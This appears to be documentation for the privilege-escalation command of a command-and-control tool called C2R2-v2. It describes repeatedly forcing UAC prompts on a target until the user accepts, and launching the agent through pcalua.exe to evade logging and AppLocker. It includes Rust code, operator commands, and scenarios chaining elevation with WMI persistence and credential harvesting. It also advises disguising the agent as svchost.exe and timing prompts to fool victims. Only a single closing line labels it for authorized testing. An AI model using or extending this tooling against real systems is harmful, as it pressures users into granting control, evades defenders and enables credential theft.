# Privilege Escalation - /elevate Command

This document describes the privilege escalation capabilities in C2R2-v2.

## Overview

The `/elevate` command triggers a UAC (User Account Control) prompt on the target system to execute commands or re-launch the agent with administrator privileges.

---

## Usage

```bash
# Select target agent
C2R2> /select 1

# Elevate the agent to admin privileges
C2R2 [1]> /elevate
```

---

## How It Works

### UAC Prompt Bombing + LOLBAS

The implementation combines two techniques:

1. **UAC Prompt Bombing** - Continuously shows UAC prompt until user accepts
2. **LOLBAS Technique** - Uses `pcalua.exe` instead of direct PowerShell for stealth

### Flow

```
1. User runs /elevate
2. Agent uses pcalua.exe (Living Off the Land Binary)
3. UAC prompt appears requesting elevation
4. If user clicks "No" → Prompt reappears
5. Continues until user clicks "Yes"
6. Agent re-executes itself with admin privileges
7. New agent connection appears with "Admin" privileges
```

### Why LOLBAS?

`pcalua.exe` (Program Compatibility Assistant) is a legitimate Windows binary that can execute other programs. Benefits:

- ✅ Signed by Microsoft
- ✅ Less suspicious in logs than PowerShell
- ✅ Bypasses some AppLocker rules
- ✅ UAC prompt shows "Microsoft" as publisher

---

## Technical Details

### Implementation

```rust
// Uses pcalua.exe to trigger UAC
fn elevate_self() -> Result<String, String> {
    let current_exe = std::env::current_exe()?;
    
    // Loop until elevation succeeds
    loop {
        let result = Command::new("pcalua.exe")
            .args(&["-a", current_exe.to_str()?])
            .spawn();
            
        if result.is_ok() {
            return Ok("Elevation triggered");
        }
        
        // Small delay before retry
        std::thread::sleep(Duration::from_millis(500));
    }
}
```

### UAC Prompt Appearance

The UAC prompt will show:
- **Program Name:** The agent executable name
- **Publisher:** "Unknown publisher" (unless code-signed)
- **File Origin:** "Hard drive on this computer"

---

## Verification

After successful elevation, check the agent's privileges:

```bash
# Check client info
C2R2> /info 1

# Should show:
# Privileges: Administrator   ← Elevated
# vs
# Privileges: User           ← Not elevated
```

Or from the agent:

```bash
C2R2 [1]> /cmd whoami /groups | findstr /i "admin"
```

---

## Attack Scenarios

### Scenario 1: Initial Foothold → Admin

```bash
# 1. Agent connects with user privileges
C2R2> /list
# ID 1 - User privileges

# 2. Elevate to admin
C2R2> /select 1
C2R2 [1]> /elevate

# 3. User sees UAC prompt (repeatedly until they accept)
# 4. New connection appears
C2R2> /list
# ID 1 - User privileges (original)
# ID 2 - Admin privileges (elevated)

# 5. Select elevated session
C2R2> /select 2
```

### Scenario 2: Persistence as Admin

```bash
# 1. Elevate first
C2R2 [1]> /elevate

# 2. After elevation, use WMI persistence (requires admin)
C2R2 [2]> /persist wmi

# WMI persistence is most stealthy and requires admin
```

### Scenario 3: Harvest Protected Credentials

```bash
# Some credential stores require admin access
C2R2 [1]> /elevate
# Wait for elevation...
C2R2 [2]> /harvest

# Admin harvest may find additional credentials
```

---

## Considerations

### Success Depends On

1. **User must accept UAC prompt** - Can't bypass without exploits
2. **UAC not set to "Always Notify"** - Some users have strict settings
3. **User is local admin** - Must be in Administrators group

### What Won't Work

- ❌ Users who aren't local administrators
- ❌ Environments with "Always deny elevation" policy
- ❌ Systems where UAC is fully disabled (already have admin)

### OPSEC Notes

- 📊 UAC prompts are logged in Windows Security Event Log
- 🔍 Repeated UAC prompts may alert security-conscious users
- ⚠️ Some EDR solutions monitor for UAC prompt patterns

---

## Stealth Improvements

### Make UAC Prompt Less Suspicious

1. **Code Sign the Agent** - Shows real publisher name
2. **Use Legitimate Name** - `RuntimeBroker.exe`, `svchost.exe`
3. **Time It Right** - When user expects prompts (installing software)

### Alternative Elevation Methods (Future)

- UAC bypass exploits (CVEs when available)
- Token manipulation
- Service exploitation
- DLL hijacking

---

## Troubleshooting

### UAC Prompt Never Appears

1. Check if UAC is disabled:
   ```bash
   /cmd reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
   ```
   If `0x0`, UAC is disabled - you already have admin potential

2. Check user is admin:
   ```bash
   /cmd net localgroup administrators | findstr /i "%username%"
   ```

### Elevation Fails Silently

1. Check for Group Policy restrictions:
   ```bash
   /cmd gpresult /scope user /v | findstr /i "elevation"
   ```

2. Try direct method:
   ```bash
   /cmd runas /user:Administrator cmd
   ```

### Multiple Elevated Sessions

After successful elevation, you'll have two sessions:
- Original session (User privileges)
- New session (Admin privileges)

Select the admin session for privileged operations:
```bash
C2R2> /info 1  # Check privileges
C2R2> /info 2  # Compare
C2R2> /select 2  # Select admin session
```

---

## Related Features

- [Persistence](PERSISTENCE.md) - WMI persistence requires admin
- [Stealer](STEALER.md) - Some credentials require elevation
- [Evasion](EVASION.md) - Anti-analysis techniques

---

**⚠️ For authorized security testing purposes only.**
